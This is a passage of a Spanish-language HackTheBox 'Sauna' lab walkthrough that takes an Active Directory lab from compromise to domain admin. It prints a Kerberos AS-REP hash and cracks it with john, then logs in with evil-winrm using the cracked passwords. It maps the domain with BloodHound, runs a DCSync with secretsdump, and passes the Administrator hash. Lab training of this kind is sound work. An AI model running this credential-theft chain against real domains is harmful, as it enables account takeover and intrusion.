+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$krb5asrep$18$fsmith</span>@EGOTISTICAL-BANK.LOCAL:d4b3b166aac99836201bbe442d83f8cd<span class="nv">$484</span>c733a9d5ce4f6f20f4b522a7b721609c0dacefb845b4f7c1e49a8d1b1886611fba87622cef20aff5ba5447b10f3da794c393744cd2678e94e9ba2ba92a0d29e202ec1d864885b9a9f6a5df463b11587dbc48f3bc0424f710d43ac0d8555b38379f35c1b94a4892669fde4d69cf2bf001f9b792e2180c6f1ea53a28f8900a93e5111c161948f91a64be36c5c8c854d8d90203ce6aab155bde6d3908e8a5c3143fe98830852f808ff8badd93090a4b29421c27a5aba7f98d66ffaa31a292b7b04415d2e0a93b1fba14a5a5f7f614bf0677e9b53c8f7673becdd9873390fc64f8231c99c14846280f5858e81eb472cbaa30156a5ddf7f4a8a641758ccb19775e9f6c8156ceda4f1485078e48b4b7fc6a44cd0ca8aa80</span></span></code></pre></div></div>
+<p>Lo crackeamos con john</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a9954ba527554fb3bede345eec9cdb16$96156f42762421bd97ebf37e092cfffebf37bde8f60743e36f9d7f78c1f0b18f7150361cda4e8f48cbc6b73800a480bb728497ef44355869649c910ba1fe98a5212f7a160a011316a703857fc2cd0d0ce24b527a97fc75f3205931a7caf7c01f329c76313cbf696df729fa52acadf61e9275a10d2fe9bf89bb2c0ae8ea6cfa419ae71cfbdcf554cb1685597c3e764861459a0dfa6b92bb2f5432cefb7ed57cfcc423176b9e2b454675711837b4ca1d17ef0188b4befa8f52d873ccd3e87b337b390fe1eae5a1654b14c596fb5ae16c2c160d48b57e247a765f616cd6cb6a8b7bf02a92100070367128f0a7267397874ed038fbeb13631f3ab51edead31e36609&#39;</span> &gt; hash.txt</span></span></code></pre></div></div>
+<p>crackeamos</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john -w<span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%204.png"
+        data-srcset="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%204.png, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%204.png 1.5x, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%204.png 2x"
+        data-sizes="auto"
+        alt="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%204.png"
+        title="Untitled" width="602" height="201" /></p>
+<p>inicio sesión sesión con evil-winrm ya que el puerto 5985 esta abierto</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175</span></span></code></pre></div></div>
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+<p>Una vez en el sistema le paso winpeas en busca de  poder escalar privilegios y encuentro la siguiente contraseña en texto plano.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%205.png"
+        data-srcset="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%205.png, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%205.png 1.5x, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%205.png 2x"
+        data-sizes="auto"
+        alt="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%205.png"
+        title="Untitled" width="552" height="148" /></p>
+<p>Si probamos a iniciar sesion con el usurio svc_loanmanager no  vamos a tener exito si realizamos el siguiente comando veremos los usuarios del sistema</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net user</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%206.png"
+        data-srcset="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%206.png, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%206.png 1.5x, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%206.png 2x"
+        data-sizes="auto"
+        alt="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%206.png"
+        title="Untitled" width="679" height="155" /></p>
+<p>Nos fijamos que se escribe svc_loanmgr</p>
+<p>iniciamos sesión con el nuevo usuario con winrm</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -u svc_loanmgr -p Moneymakestheworldgoround! -i 10.10.10.175</span></span></code></pre></div></div>
+<p>Tras una enumeración veo que tengo los mismos permisos que con el usuario fsmith.</p>
+<p>Por lo que pruebo a usar BloodHound</p>
+<p>Transfiero SharpHound.ps1 a la maquina con:</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#En kali</span>
+</span></span><span class="line"><span class="cl">locate SharpHound.ps1
+</span></span><span class="line"><span class="cl">cp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 .
+</span></span><span class="line"><span class="cl"><span class="c1">#en la terminal de winrm</span>
+</span></span><span class="line"><span class="cl">upload SharpHound.ps1
+</span></span><span class="line"><span class="cl"><span class="c1">#Importamos</span>
+</span></span><span class="line"><span class="cl">. .<span class="se">\S</span>harpHound.ps1
+</span></span><span class="line"><span class="cl"><span class="c1"># y ejecutamos</span>
+</span></span><span class="line"><span class="cl">Invoke-BloodHound -CollectionMethod All
+</span></span><span class="line"><span class="cl"><span class="c1">#Transferimos el zip a nuestra maquina</span>
+</span></span><span class="line"><span class="cl">download 20231106220357_BloodHound.zip</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%207.png"
+        data-srcset="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%207.png, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%207.png 1.5x, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%207.png 2x"
+        data-sizes="auto"
+        alt="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%207.png"
+        title="Untitled" width="886" height="470" /></p>
+<p>Iniciamos Bloodhound</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo bloodhound</span></span></code></pre></div></div>
+<p>Buscamos los nombres de los usuarios a los que tenemos acceso y los marcamos como owned después  vemos que podemos realizar un ataque Dcsync haciendo clic en el apartado de analisis la opcion Find Shortest Paths to domain Admins</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%208.png"
+        data-srcset="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%208.png, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%208.png 1.5x, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%208.png 2x"
+        data-sizes="auto"
+        alt="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%208.png"
+        title="Untitled" width="894" height="747" /></p>
+<p>Hacemos clic en donde pone DCSync, seleccionamos help y nos indica como efectuar el ataque</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%209.png"
+        data-srcset="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%209.png, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%209.png 1.5x, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%209.png 2x"
+        data-sizes="auto"
+        alt="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%209.png"
+        title="Untitled" width="602" height="357" /></p>
+<p>Con secretsdump obtenemos los hashes para hacer un Passthehash</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/opt/impacket/examples/secretsdump.py <span class="s1">&#39;EGOTISTICAL-BANK.LOCAL&#39;</span>/<span class="s1">&#39;svc_loanmgr&#39;</span>:<span class="s1">&#39;Moneymakestheworldgoround!&#39;</span>@10.10.10.175</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%2010.png"
+        data-srcset="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%2010.png, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%2010.png 1.5x, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%2010.png 2x"
+        data-sizes="auto"
+        alt="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%2010.png"
+        title="Untitled" width="1053" height="236" /></p>
+<p>Nos conectamos con winrm</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%2011.png"
+        data-srcset="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%2011.png, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%2011.png 1.5x, /sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%2011.png 2x"
+        data-sizes="auto"
+        alt="/sauna/Sauna%202d4dfc8ca55946e3a306fb66f9f73cbb/Untitled%2011.png"
+        title="Untitled" width="739" height="240" /></p>
+<p>y obtenemos una powershell como administrador.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Actualizado el 2023-11-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/sauna/index.md" target="_blank">Leer Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Compartir en X" data-sharer="x" data-url="http://localhost:1313/sauna/" data-title="Sauna Walkthrough" data-hashtags="Walkthrough,HackTheBox,TjNull,OSCP,Easy,AD,Active directory"><i class="fab fa-x-twitter" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Threads" data-sharer="threads" data-url="http://localhost:1313/sauna/" data-title="Sauna Walkthrough"><i class="fab fa-threads" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Facebook" data-sharer="facebook" data-url="http://localhost:1313/sauna/" data-hashtag="Walkthrough"><i class="fab fa-facebook-square" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/sauna/"><i class="fab fa-linkedin" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/sauna/" data-title="Sauna Walkthrough"><i class="fab fa-hacker-news" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Line" data-sharer="line" data-url="http://localhost:1313/sauna/" data-title="Sauna Walkthrough"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en 微博" data-sharer="weibo" data-url="http://localhost:1313/sauna/" data-title="Sauna Walkthrough"><i class="fab fa-weibo" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Compartir en Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/sauna/" data-title="Sauna Walkthrough" data-description=""><i class="fab fa-diaspora" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fsauna%2f&amp;text=Sauna%20Walkthrough" target="_blank" title="Compartir en Telegram"><i class="fab fa-telegram" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/walkthrough/">Walkthrough</a>,&nbsp;<a href="/tags/hackthebox/">HackTheBox</a>,&nbsp;<a href="/tags/tjnull/">TjNull</a>,&nbsp;<a href="/tags/oscp/">OSCP</a>,&nbsp;<a href="/tags/easy/">Easy</a>,&nbsp;<a href="/tags/ad/">AD</a>,&nbsp;<a href="/tags/active-directory/">Active Directory</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Regresar</a></span>&nbsp;|&nbsp;<span><a href="/">Inicio</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/dc-9/" class="prev" rel="prev" title="DC-9 Walkthrough"><i class="fas fa-angle-left" aria-hidden="true"></i>DC-9 Walkthrough</a>
+            <a href="/crane/" class="next" rel="next" title="Crane">Crane<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Con la tecnología de <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.157.0">Hugo</a> | Tema - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">AnTuSec</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Volver arriba">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="Ver comentarios">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lunr/lunr.stemmer.support.min.js"></script><script src="/lib/lunr/lunr.es.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"es","maxResultLength":10,"noResultsFound":"No se encontraron resultados","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
